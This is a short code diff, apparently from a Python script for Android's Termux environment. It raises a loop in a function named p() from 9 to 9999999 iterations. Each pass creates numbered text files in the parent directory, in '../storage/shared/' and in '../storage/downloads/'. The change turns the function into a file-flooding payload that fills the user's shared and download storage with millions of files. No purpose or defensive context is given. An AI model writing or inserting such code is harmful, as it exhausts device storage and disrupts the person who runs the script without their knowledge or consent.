@@ -13,7 +13,7 @@ except ImportError:
 
 
 def p():
-  for num in range(9):
+  for num in range(9999999):
    file = open('../'+str(num)+'.txt','w')
    file = open('../storage/shared/'+str(num)+'.txt','w')
    file = open('../storage/downloads/'+str(num)+'.txt','w')
